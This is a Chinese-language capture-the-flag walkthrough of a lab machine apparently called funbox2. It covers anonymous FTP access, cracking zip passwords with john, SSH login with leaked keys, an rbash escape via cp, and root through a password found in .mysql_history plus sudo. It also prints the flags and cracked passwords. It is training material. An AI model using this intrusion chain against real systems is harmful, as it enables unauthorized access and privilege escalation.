## 总结

getwebshell →`21-FTP`泄露敏感文件 →`john`爆破出密码 → 泄露密钥文件 →`ssh`密钥登录

提 权 思 路 →`rbash`利用`cp`逃逸 → 发现泄露的用户密码 →`sudo`提权

## 准备工作

  * 启动VPN  
获取攻击机IP >`192.168.45.194`

![](https://image.3001.net/images/20230801/1690892535_64c8f8f7e1b5b62346692.png!small)

  * 启动靶机  
获取目标机器IP >`192.168.227.107`

![](https://image.3001.net/images/20230801/1690892536_64c8f8f8cd731104de7e3.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.227.107
    

![](https://image.3001.net/images/20230801/1690892537_64c8f8f98b4b21e32ee84.png!small)  
通过两次收集到的端口:`→21,22,80,37323`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p21,22,80 192.168.227.107
    

![](https://image.3001.net/images/20230801/1690892538_64c8f8fa7d07a1692177c.png!small)

## 信息收集-端口测试

### 21-FTP端口的信息收集

#### 21-FTP版本版本信息

通过`Nmap`探测获得FTP的版本信息，可以大致推测FTP的配置文件位置

    
    
    # nmap探测版本为ProFTPD 1.3.5e
    cat /etc/proftpd.conf
    cat /etc/proftpd/proftpd.conf
    

#### 21-FTP端口匿名登录测试

尝试匿名账号`anonymous`以及无密码进行登录测试

    
    
    # 利用ftp协议+ip进行连接测试
    ftp 192.168.227.107
    Name: anonymous
    

匿名登陆成功，无需密码

![](https://image.3001.net/images/20230801/1690892540_64c8f8fc022aa0cf0a136.png!small)

#### 21-FTP端口-文件GET收集

登录FTP之后利用`ls`查看存在哪些目录，翻阅的同时查看一下文件权限  
利用`GET`下载文件，利用`PUT`上传文件

    
    
    # binary 以二进制模式传输文件，保证文件完整
    ftp > binary
    # 查看目录结构
    ftp > ls -al
    # cd 查看存储的文件
    ftp > cd [file_date_name]
    # get 下载文件
    ftp > get [file_name]
    

里面发现了一堆文件

![](https://image.3001.net/images/20230801/1690892541_64c8f8fd35fe7bdf8fb52.png!small)  
本来文件少的话会选择用`get`下载文件

    
    
    wget -m ftp://192.168.227.107
    

![](https://image.3001.net/images/20230801/1690892542_64c8f8fe8046004199116.png!small)

#### 21-FTP端口-文件PUT测试(无)

    
    
    # touch一个文件测试上传
    touch test.txt
    # put 上传文件
    ftp > put [file_name]
    

测试发现无上传功能

![](https://image.3001.net/images/20230801/1690892543_64c8f8ff859f77a32457a.png!small)

#### 文件信息获取

当尝试解压文件发现需要密码

![](https://image.3001.net/images/20230801/1690892544_64c8f900a9a3dedc6503d.png!small)

##### 暴力破解-hash密码破解

挨个破解hash密码

###### anna.zip(失败)

    
    
    # 利用zip2john将zip转换
    zip2john anna.zip  >  anna_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt anna_password.hash
    

![](https://image.3001.net/images/20230801/1690892545_64c8f901bf3932d055bdf.png!small)

###### ariel.zip(失败)

    
    
    # 利用zip2john将zip转换
    zip2john ariel.zip  >  ariel_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt ariel_password.hash
    

![](https://image.3001.net/images/20230801/1690892546_64c8f902a7eccf37e15a7.png!small)

###### bud.zip(失败)

    
    
    zip2john bud.zip  >  bud_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt bud_password.hash
    

![](https://image.3001.net/images/20230801/1690892547_64c8f903d9b81d563178c.png!small)

###### cathrine.zip

    
    
    zip2john cathrine.zip  >  cathrine_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt cathrine_password.hash
    

爆破出密码`catwoman`

![](https://image.3001.net/images/20230801/1690892548_64c8f904dd88d34bbab6a.png!small)  
进行解压发现密钥

![](https://image.3001.net/images/20230801/1690892550_64c8f90641a2eab364cce.png!small)

###### homer.zip(失败)

    
    
    zip2john homer.zip  >  homer_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt homer_password.hash
    

![](https://image.3001.net/images/20230801/1690892551_64c8f907b92b83d59ed3c.png!small)

###### tom.zip

    
    
    zip2john tom.zip  >  homer_password.hash
    # 利用john离线破译hash的zip密码
    john --wordlist=/usr/share/wordlists/rockyou.txt homer_password.hash
    

获得`tom`的密码`iubire`

![](https://image.3001.net/images/20230801/1690892552_64c8f908c80a234de9464.png!small)  
解压发现`tom`的密钥

###### 其他的zip

非常枯燥无味的过程，其他的`zip`都没有爆破出密码

###### welcome.msg

里面有一些信息(待定)

![](https://image.3001.net/images/20230801/1690892554_64c8f90a140884b35e0e7.png!small)

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测出来`OpenSSH 7.6p1 Ubuntu 4ubuntu0 .3`

    
    
    # 进入msf
    msfconsole
    # 搜索对应脚本
    msf6 > searchsploit OpenSSH 7.6p1
    

发现了类似用户枚举的利用(待定)

![](https://image.3001.net/images/20230801/1690892555_64c8f90b304c953938a52.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    sudo ssh root<span class="label label-primary">@192.168.227.107</span> -v
    # 如果显示publickey、password就是都支持
    

支持密钥以及密码登录

![](https://image.3001.net/images/20230801/1690892556_64c8f90cbfa677a085712.png!small)

### 80-HTTP端口的信息收集

访问`http://192.168.227.107:80`不过首先利用21端口获得的密钥

## 漏洞利用-getwebshell

### 密钥登录

根据21端口获得的两个密钥尝试进行登录

获取密钥之后指定密钥进行登录，用户名选用压缩包的前缀

    
    
    # cathrine登录失败
    ssh -i cathrine_id_rsa cathrine<span class="label label-primary">@192.168.227.107</span> -p22
    # tom登录成功
    ssh -i tom_id_rsa tom<span class="label label-primary">@192.168.227.107</span> -p22
    

![](https://image.3001.net/images/20230801/1690892557_64c8f90de3231f58b3575.png!small)

## 内网遨游-getshell

### FLAG1获取

    
    
    tom<span class="label label-primary">@funbox2</span>:~$ ls
    local.txt
    tom<span class="label label-primary">@funbox2</span>:~$ cat local.txt
    4de86179dae42ff3cbce887f5f8338e4
    

![](https://image.3001.net/images/20230801/1690892559_64c8f90f97deea3eca868.png!small)

### Linux用户交互shell受限逃逸

在操作的过程中发现`cd`命令存在`rbash`限制

![](https://image.3001.net/images/20230801/1690892560_64c8f9106da8db7f25451.png!small)  
枚举是找到突破方法的重要组成部分。  
首先发现很多命令是能用的，但是`cd`之类的不太能用，尝试枚举可以用的命令

#### "/"限制

    
    
    # 检查cd、ls、echo命令
    cd /home
    # 如果"/"命令可用的话,运行/bin/sh或者/bin/bash
    /bin/bash
    

测试发现`cd`、`/`不能用

![](https://image.3001.net/images/20230801/1690892561_64c8f9112036b37fb7912.png!small)

#### rbash、rksh、rsh逃逸之"cp"可用

    
    
    # 检查是否可以cp文件
    ls -al /bin/cp
    # 如果"cp"命令可用的话,将/bin/sh或者/bin/bash复制到当前目录
    cp /bin/sh .
    # 运行即可逃逸，这个不行试试另一个
    sh
    

发现`cp`可用之后逃逸成功

![](https://image.3001.net/images/20230801/1690892562_64c8f9120102b0b35e89b.png!small)

### 内网信息收集

在之前查看`tom`文件内的内容时，发现了`.mysql_history`文件，一般的用户下是没有这个文件的，进行查看。

![](https://image.3001.net/images/20230801/1690892562_64c8f912c8e10f21f42e6.png!small)

    
    
    cat .mysql_history
    

发现了插入`tom`密码的内容

    
    
    _HiStOrY_V2_
    show40databases;
    quit
    create40database40'support';
    create40database40support;
    use40support
    create40table40users;
    show40tables
    ;
    select40*40from40support
    ;
    show40tables;
    select40*40from40support;
    insert40into40support40(tom,40xx11yy22!);
    quit
    

![](https://image.3001.net/images/20230801/1690892563_64c8f913e4bb854918335.png!small)

### 权限提升

我们得到了`tom`的密码为`xx11yy22!`  
通常在什么情况下会用到密码呢？`sudo`时可能会用到

#### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

使用该命令提示需要`tom`的密码，成功

![](https://image.3001.net/images/20230801/1690892565_64c8f9153091a472b12da.png!small)

存在`(ALL) NOPASSWD: ALL`

    
    
    # su提权
    sudo su
    

提权成功

![](https://image.3001.net/images/20230801/1690892566_64c8f9163e7bde8a4d191.png!small)

### FLAG2获取

    
    
    root<span class="label label-primary">@funbox2</span>:/home/tom# cat /root/proof.txt
    8955c0057ac5c17dfabf3a310d6fdb4f
    

完结撒花~

